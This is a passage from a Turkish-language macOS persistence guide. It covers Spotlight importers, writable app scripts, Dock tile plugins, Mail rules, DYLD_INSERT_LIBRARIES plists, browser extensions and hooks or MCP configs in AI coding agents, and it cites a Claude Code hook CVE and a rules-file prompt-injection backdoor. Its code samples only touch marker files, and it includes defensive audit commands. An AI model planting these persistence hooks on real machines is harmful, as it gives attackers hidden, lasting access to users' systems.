    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Eklentileri

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak bir uygulama sandbox'ının içinde kalırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox oldukça kısıtlı görünüyor

#### Konum

- `~/Library/Spotlight/`
  - **Tetikleyici**: Spotlight eklentisinin yönettiği uzantıya sahip yeni bir dosya oluşturulur.
- `/Library/Spotlight/`
  - **Tetikleyici**: Spotlight eklentisinin yönettiği uzantıya sahip yeni bir dosya oluşturulur.
  - Root gerekir
- `/System/Library/Spotlight/`
  - **Tetikleyici**: Spotlight eklentisinin yönettiği uzantıya sahip yeni bir dosya oluşturulur.
  - Root gerekir
- `Some.app/Contents/Library/Spotlight/`
  - **Tetikleyici**: Spotlight eklentisinin yönettiği uzantıya sahip yeni bir dosya oluşturulur.
  - Yeni bir uygulama gerekir

#### Açıklama ve Exploitation

Spotlight, macOS'un yerleşik arama özelliğidir ve kullanıcılara **bilgisayarlarındaki verilere hızlı ve kapsamlı erişim** sağlamak üzere tasarlanmıştır.\
Bu hızlı arama özelliğini sağlamak için Spotlight, **özel bir veritabanı** tutar ve **çoğu dosyayı ayrıştırarak** bir dizin oluşturur; böylece hem dosya adlarında hem de dosya içeriklerinde hızlı arama yapılabilir.<sup>[[25]](#references)</sup>

Spotlight'ın temel mekanizmasında, **'metadata server' (meta veri sunucusu)** anlamına gelen 'mds' adlı merkezi bir süreç bulunur. Bu süreç, Spotlight hizmetinin tamamını yönetir. Bunu tamamlayan birden fazla 'mdworker' daemon'u, farklı dosya türlerini dizine eklemek gibi çeşitli bakım görevlerini yerine getirir (`ps -ef | grep mdworker`). Bu görevler, Spotlight'ın çok çeşitli dosya biçimlerindeki içeriği anlamasını ve dizine eklemesini sağlayan Spotlight importer eklentileri veya **".mdimporter bundles**" sayesinde gerçekleştirilir.

Eklentiler veya **`.mdimporter`** bundle'ları daha önce belirtilen konumlarda bulunur. Yeni bir bundle'ın keşfedilmesi ve bir dosya türüyle eşleşmesi gerekir; ayrıca Spotlight'ın eşleşen bir dosyayı gerçekten dizine eklemesi gerekir. Yalnızca bir bundle'ı kopyalamak, onun yüklendiğini kanıtlamaz. [Apple'ın MDImporter başvurusu](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter), yüklemenin uygun bir dosyanın değiştirilmesiyle ilişkili olduğunu belirtir. macOS 26'da Spotlight importer'larının çalıştırılması burada test edilmedi.

Yüklenmiş tüm `mdimporters`'ları çalıştırarak **bulmak** mümkündür:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter**, bu tür dosyaları (diğerlerinin yanı sıra `.iba` ve `.book` uzantılı dosyaları) ayrıştırmak için kullanılır:

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Diğer `mdimporter`'ların Plist'ini kontrol ederseniz **`UTTypeConformsTo`** girdisini bulamayabilirsiniz. Bunun nedeni, bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantıları belirtmesinin gerekmemesidir.
>
> Ayrıca, sistemin varsayılan eklentileri her zaman önceliklidir; bu nedenle bir saldırgan yalnızca Apple'ın kendi `mdimporter`'ları tarafından dizine eklenmeyen dosyalara erişebilir.

Kendi importer'ınızı oluşturmak için şu projeyle başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer). Ardından adı değiştirin, **`CFBundleDocumentTypes`**'ı düzenleyin ve desteklemek istediğiniz uzantıyı desteklemesi için **`UTImportedTypeDeclarations`** ekleyip bunları **`schema.xml`** dosyasına yansıtın.\
Son olarak, işlenen uzantıya sahip bir dosya oluşturulduğunda payload'ınızı çalıştıracak şekilde **`GetMetadataForFile`** işlevinin kodunu **değiştirin**.

Son olarak, yeni `.mdimporter`'ınızı **derleyip önceki üç konumdan birine kopyalayın**. Yüklenip yüklenmediğini **logları izleyerek** veya **`mdimport -L`** komutunu çalıştırarak kontrol edebilirsiniz.

> [!TIP]
> Importer sandbox'ı çok kısıtlayıcı olsa da `mdworker`, dosyaları **ayrıcalıklı okuma erişimiyle** dizine ekler. Bu nedenle kötü amaçlı bir `.mdimporter`, TCC korumalı konumlardaki (Downloads, Pictures, Desktop, …) dosyaların *içeriğini* okuyabilir ve toplanan metadata'yı hiçbir TCC istemi olmadan dışarı sızdırabilir — bu, macOS Sequoia 15.4'te yamalanan **"Sploitlight" TCC bypass'ıdır (CVE-2025-31199)**.<sup>[[55]](#references)</sup>

Sistem logları yerine **Darwin notification adlarında** korumalı baytları taşıyan farklı macOS 26 tekniği için bkz. [Spotlight importer leakage via Darwin notification names](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Tercih Bölmesi~~

> [!CAUTION]
> Görünüşe göre bu artık çalışmıyor.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Belirli bir kullanıcı eylemi gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Açıklama

Görünüşe göre bu artık çalışmıyor.<sup>[[26]](#references)</sup>

### Uygulama Betik Dosyaları

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak hedeflenen uygulamanın kurulu olması ve kurban tarafından çalıştırılması/kullanılması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

Kurulu bir uygulamanın veya aracın gerçekten çalıştırdığı ve aktörün değiştirebildiği **yorumlanan bir betik**. Dosyanın izinlerini ve çağrıldığı yolu doğrulayın; yalnızca bir `.sh` veya `.py` dosyası bulmak yeterli değildir. Apple'ın [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) belgesine göre imzalı uygulama paketleri, betikler de dahil olmak üzere kaynakları mühürler. Paket içindeki bir betiği düzenlemek bu mührü bozar ve paket doğrulanırken değişiklik tespit edilebilir veya engellenebilir. Homebrew'in başlatıcısı gibi harici bir betiğin imzalama ve güven davranışı farklıdır. Writeup'taki tarihî örnekler:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – eski Sublime Text sürümlerinin kullandığı bir betik; kurulu sürümde dosyanın ve başlangıçta kullanımının doğrulanması gerekir. Test Mac'inde yoktu.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) veya **`/usr/local/bin/brew`** (Intel) – kuruluysa ve aktör tarafından yazılabiliyorsa, ilgili `brew` yolu çağrıldığında çalıştırılan bir Bash başlatıcısı. Test Mac'inde `/opt/homebrew/bin/brew` yazılabilir bir Bash betiğiydi; bu, yerel bir gözlemdir, Homebrew izinlerine ilişkin genel bir kural değildir.
- **Python uygulama paketinin içindeki IDLE'ın `idlemain.py` dosyası** – yazmak için yönetici izni gerekebilir, ancak IDLE kullanıcısının kimliğiyle çalışır.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – ilgili `org.wireshark.ChmodBPF` launchd işi kurulu olduğunda root olarak çalıştırılan tarihî bir shell betiği. Test Mac'inde betik ve iş yoktu.

#### Açıklama ve Exploitation

Bazı araçlar ve uygulamalar çalışma zamanında yorumlanan betikler çalıştırır. Yazılabilir bir betiğe eklenen komutlar, imza doğrulaması, quarantine ve diğer kontroller izin verdiği sürece, betiğin belirli çağırıcısı bir sonraki çalıştırıldığında yürütülebilir. İlk araştırmada 2019'daki birkaç kurulum gösterilmişti; hedef sürümde bu yolları ve tetikleyicileri yeniden kontrol edin.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Bu kopya testi macOS 26.5.2'de `marker fired: True` sonucunu verdi; orijinal launcher'a dokunulmadı. Bu, ekleme noktasının kopyada çalıştığını kanıtlar; değiştirilmiş imzalı bir app bundle'ın veya gerçek bir Homebrew kurulumunun tüm başlatma denetimlerinden geçeceğini değil.

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Sandbox'ı aşmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Eklentiyi bildiren bir app'in Dock tarafından keşfedilmesi/kaydettirilmesi ve işlenmesi gerekir
  - Plugin, app-sandbox entitlement'ı olmayan ve **library validation devre dışı bırakılmış** **Apple-imzalı** bir yardımcı uygulamaya yüklenir. Atıf yapılan araştırmada bu yardımcı uygulama Background Task Management UI'da gösterilmedi; hedef sürümde görünürlüğü kontrol edilmelidir.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**; app'in `Info.plist` dosyasındaki **`NSDockTilePlugIn`** anahtarıyla belirtilir. Plugin'in kendi `Info.plist` dosyası **`NSPrincipalClass`** değerini ayarlar.

#### Açıklama ve Exploitation

Bir app `NSDockTilePlugIn` bildirdiğinde Dock, referans verilen bundle'ı oturum açıldığında veya tile'ı eklendiğinde **`com.apple.dock.external.extra`** XPC helper'ına (Apple Silicon'da `...extra.arm64`) yükleyebilir; app'in kendisinin başlatılması gerekmez. Bunun için app'in macOS tarafından keşfedilmesi/kaydettirilmesi ve kabul edilmesi gerekir. Helper **Apple-imzalıdır**, `com.apple.security.app-sandbox` entitlement'ına sahip değildir ve `com.apple.security.cs.disable-library-validation` özelliğine sahiptir. Yükleme sırasında principal class'ın **`setDockTile:`** metodu çağrılır; buradan daha sonraki olaylar için dağıtılmış bildirimlere (ör. `com.apple.screenIsLocked`) abone olabilir.<sup>[[38]](#references)</sup>

macOS 26.5.2'de salt okunur `codesign` incelemesi, helper'ın Apple imzasını ve entitlement'larını doğruladı; ayrıca yüklü birkaç app'in `NSDockTilePlugIn` bildirdiği görüldü. Bu Mac'te yeni bir plugin yüklenmedi veya çalıştırılmadı; dolayısıyla yeni yazılmış bir bundle'ın bu sürümde çalışması henüz test edilmedi.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Sandbox'ı aşmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Widget extension **kendi sürecinde** çalışır ve bir tane eklemek **Background Task Management** uyarısını tetiklemez
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Config plist, TCC korumalı bir container içinde bulunur; bu nedenle dışarıdan düzenlemek için Full Disk Access veya bir TCC bypass gerekir

#### Konum

- Widget extension bundle: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Etkin/kayıtlı widget'lar: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (anahtarlar `widgets.instances` ve `widgets.widgets`)

#### Açıklama ve Exploitation

Bir uygulamanın içinde dağıtılan WidgetKit extension, Notification Center tarafından yönetilen **kendi sürecinde** çalışır. `widgets.instances` içine bir örnek kaydedip (gömülü `INIntent` verileri içeren, base64 ile kodlanmış bir `NSKeyedArchiver` `CHSWidget` blob'u) NotificationCenter'ı yeniden başlatmak, widget'ın yüklenmesini ve `TimelineProvider`/intent kodunu çalıştırmasını sağlar.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Kuralları (Run AppleScript)

Yazı: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak Mail.app bir hesapla yapılandırılmış ve çalışır durumda olmalı; tetikleyici gelen bir e-postadır
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Kuralları/scriptleri Mail dışından düzenlemek, Mail'in kapatılmasını ve modern macOS'ta Full Disk Access verilmesini gerektirebilir

#### Konum

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (yerel kurallar; Sonoma/Sequoia'da `V10`, daha yeni sürümlerde `V11`+)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud ile eşzamanlanan kurallar; önceliklidir)
- Kuralın etkinleştirilme durumu: **`RulesActiveState.plist`**; AppleScript payload'u: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Açıklama ve Exploitation

Bir Apple Mail **kuralı**, *"Run AppleScript"* eylemine sahip olabilir. Saldırgan, hazırlanmış bir **konu satırıyla** eşleşen ve bir saldırgan scriptini çalıştıran bir kural ekleyerek, sihirli e-posta geldiğinde Mail'in bağlamında **uzaktan tetiklenebilir ve gizli** kod yürütme elde eder. Bu yöntem, hiçbir LaunchAgent/Login Item oluşturulmadığından birçok persistence tarayıcısından kaçabilir.<sup>[[42]](#references)</sup> Kuralı tetikleyici e-postayı da **silecek** şekilde ayarlamak kanıtları gizler. Savunmacılar bunu doğrudan arayabilir:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

Yazı: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- sandbox bypass için kullanışlı: [🔴](https://emojipedia.org/large-red-circle)
  - Modern macOS, System Settings → *Device Management* bölümünde **kullanıcının manuel onayını** gerektirir (MDM dışında sessiz `profiles install` artık kullanılamaz)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Yüklü profiller **`/Library/Managed Preferences/`** ve **`/var/db/ConfigurationProfiles/`** konumlarında bulunur; profil, `PayloadContent` dizisi içeren bir XML plist'tir.

#### Açıklama ve Exploitation

Bir `.mobileconfig`, doğrudan bir code-execution primitive değildir; ancak **güvenilir bir root CA** (`com.apple.security.root`), **global veya PAC proxy** (`com.apple.proxy.*`), **yönetilen tercihler** (`com.apple.ManagedClient.preferences`) ya da kısıtlamalar gibi yapılandırmaları kalıcı hâle getirebilir. macOS 10.15 ve sonraki sürümlerde Apple'ın [`PayloadRemovalDisallowed` tanımı](https://developer.apple.com/documentation/devicemanagement/toplevel), kaldırma parolası payload'ı olmadan **manuel olarak yüklenen** bir profilde bu ayarın `true` yapılmasının, profili kaldırmak için **yönetici kimlik doğrulaması** gerektirdiğini belirtir; bu, profili mutlak surette kaldırılamaz hâle getirmez. MDM ile yüklenen profillerin yönetim ve kaldırma kuralları ayrıdır.<sup>[[44]](#references)</sup>

> [!WARNING]
> Düz bir configuration profile, rastgele bir `LaunchDaemon`/`LaunchAgent` oluşturan **hiçbir payload türü içermez**. Bu şekilde bir daemon yüklemek için tam **MDM kaydı** ve bir yönetim agent'ı/script gerekir — `.mobileconfig` dosyasını launchd ile dağıtım yöntemi olarak değerlendirmeyin.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Kalıcılığı

- Sandbox'ı bypass etmek için kullanışlı: [🔴](https://emojipedia.org/large-red-circle)
  - dyld, SIP/platform ikili dosyaları, hardened-runtime uygulamaları ve setuid hedefleri için `DYLD_*` değişkenlerini **kaldırır**; bu nedenle yalnızca korumasız süreçlere enjekte eder ve SIP'yi/hardened runtime'ı **bypass etmez**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Güvenilir yöntem: kötü amaçlı bir `LaunchAgent`/`LaunchDaemon` plist içindeki **`EnvironmentVariables`** sözlüğü (girişte/açılışta çalışır)
- Kullanımdan kalkmış/geçmişte kalmış (yalnızca raporlama için): **`~/.MacOSX/environment.plist`** (10.8'de kaldırıldı) ve **`/etc/launchd.conf`** (10.10'da kaldırıldı)

#### Açıklama ve Exploitation

Bir saldırgan `DYLD_INSERT_LIBRARIES` değişkenini kurban sürecinin ortamına ekleyebilirse dyld, saldırganın dylib'ini (constructor'ı çalışır) o sürece yükler. Kalıcılık sağlayan yöntemde bu değişken bir LaunchAgent'a eklenir; böylece job her başlatıldığında yeniden enjekte edilir. Modern macOS'ta `launchctl setenv DYLD_*` filtrelendiğinden, bunun yerine değişkeni plist'e ekleyin.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

For dylib injection/hijacking mekaniklerinin tamamı için bkz.:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Kodlama Agent CLI'ları (hooks, MCP sunucuları, rules dosyaları)

Writeups: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Geliştiricinin ilgili agent'ı kullanması gerekir. Agent yapılandırmasını kabul ettiğinde başlangıç komutları, o kullanıcının yetkileriyle çalışır; workspace güveni ve MCP onayı ürüne ve oturum moduna göre değişir.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (kullanıcı olarak çalışır; terminalin/agent'ın zaten sahip olduğu tüm yetkileri devralır)

#### Konum

Açıkça tanımlanan hook ve MCP yapılandırma dosyaları, **geliştirici aracı kullandığında shell komutlarının veya alt süreçlerin çalışmasına neden olabilir** — kullanıcı başına global bir dosyadan (persistence) veya bir repo'ya eklenmiş dosyadan (supply-chain) çalışabilir. `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` ve editor rules, **agent'a verilen talimatlardır**; dosya okunduğunda shell komutlarının çalışacağını garanti etmez. Etkileri agent'ın davranışına ve araç izinlerine bağlıdır. Her ürünün güncel güven ve onay kurallarını kontrol edin.

- **Claude Code**
  - `~/.claude/settings.json`, proje `.claude/settings.json`, `.claude/settings.local.json` ve yalnızca root tarafından kullanılabilen **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM/managed settings **kullanıcı tarafından geçersiz kılınamaz** → güçlü persistence)
  - `hooks` nesnesi — `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` olaylarının her biri bir shell `command` çalıştırır
  - `statusLine.command` — durum satırını oluşturmak için çalıştırılan bir shell komutu (her oturumda)
  - `~/.claude.json` / proje `.mcp.json` dosyalarındaki MCP sunucuları — alt süreç olarak `command`+`args` ile başlatılır
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — agent davranışına ve araç izinlerine tabi, prompt injection girişiminde bulunabilecek talimatlar
- **OpenAI Codex CLI**: `~/.codex/config.toml` içindeki `[mcp_servers.*]` (`command`/`args` alt süreçler olarak başlatılır); proje talimatları için `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP sunucuları); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … komutları çalıştırır); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot için `.github/copilot-instructions.md`

#### Açıklama ve Exploitation

Bir aktör hesabın kullanıcıya özel global ayarlarını değiştirebilirse, bu hesaptaki sonraki oturumlarda hook veya MCP komutları çalışabilir. Repo tarafından kontrol edilen bir yapılandırma ise ayrı bir durumdur: [güncel Claude Code güvenlik belgelerinde](https://code.claude.com/docs/en/security) etkileşimli bir workspace güven iletişim kutusu ve proje `.mcp.json` sunucuları için ayrı bir onay istemi açıklanır. [İzin matrisi](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder), bir üst klasöre güven verildikten sonra hook'ların çalışabileceğini ve `claude -p`/SDK oturumlarında etkileşimli güven isteminin gösterilmediğini belirtir; bu etkileşimsiz modlarda proje MCP sunucuları onay istemi olmadan bağlanır. CVE-2025-59536 olarak bildirilen, güven verilmeden önce proje hook'larının çalışmasını sağlayan bypass [2025'te düzeltildi](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); bunu mevcut varsayılan davranış olarak değerlendirmeyin. Teslimat vektörleri arasında ele geçirilmiş bir repo veya kötü amaçlı bir yükleyici bulunabilir. Rules dosyası üzerinden prompt injection, açıkça tanımlanmış bir hook'a göre daha az belirleyicidir ve yine de araç onaylarına bağlıdır.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Aşağıda kullanıcıya özel global Claude Code ayarlarına bir örnek verilmiştir; test ederken bunu yalnızca gözden çıkarılabilir bir hesapta kullanın:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Kullanıcı genelindeki Codex MCP yapılandırması örneği:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Örnek Cursor hook yapılandırması; kullanmadan önce yüklü sürümünün şemasını kontrol edin:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Tarayıcı Eklentileri (Chromium: Chrome / Brave / Edge)

Yazı: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [macOS'ta ExtensionInstallForcelist kötüye kullanımı](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Sandbox'ı aşmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Desteklenen bir tarayıcı ve yüklenmiş, etkinleştirilmiş bir eklenti gerekir. macOS'ta External Extensions için kullanıcı onayı gerekir; yönetilen zorunlu yükleme için uygun bir kurumsal politika gerekir.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Bu, **native messaging hosts**'tan farklıdır (yukarıdaki *Chrome native messaging hosts* bölümüne bakın). Burada kalıcılık sağlayan, **otomatik yüklenen eklentinin** kendisidir.

#### Konum

- **External Extensions JSON** (tarayıcı başlatıldığında keşfedilir, ardından macOS'ta etkinleştirme istemine tabi olur):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (kullanıcı başına) veya `/Library/Application Support/Google/Chrome/External Extensions/` (tüm kullanıcılar)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- Yönetilen tercihler / bir yapılandırma profili üzerinden **kurumsal politika ile zorunlu yükleme**:
  - `com.google.Chrome` anahtarı `ExtensionInstallForcelist` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), `/Library/Managed Preferences/` içinden veya yüklenmiş bir `.mobileconfig` dosyasından okunur

#### Açıklama ve İstismar

Bunlar iki farklı yükleme yoludur. Chrome'un [external-install belgeleri](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions), *External Extensions* dosyası aracılığıyla sunulan bir eklentiyi **Windows ve macOS kullanıcılarının onaylayıp etkinleştirmesi gerektiğini** belirtir; eklenti yalnızca bu JSON dosyası yazıldı diye çalıştırılmaz. macOS'ta tüm kullanıcılar için yükleme yapılırken Chrome, external-extension dosyasının ayrıcalıksız kullanıcılar tarafından değiştirilmesine karşı korunmasını da gerektirir. Yönetilen bir `ExtensionInstallForcelist` veya `ExtensionSettings` politikası, kullanıcı etkileşimi olmadan bir eklentiyi yükleyip sabitleyebilir; [Google'ın Mac politika kılavuzu](https://support.google.com/chrome/a/answer/7517624) yönetilen yapılandırmayı açıklar ve zorunlu yüklenen eklentilerin kullanıcı tarafından kaldırılamayacağını belirtir. Bu bir politika dağıtım yoludur; kullanıcı başına kullanılan bir `defaults write` kestirmesi değildir.<sup>[[49]](#references)</sup>

> [!WARNING]
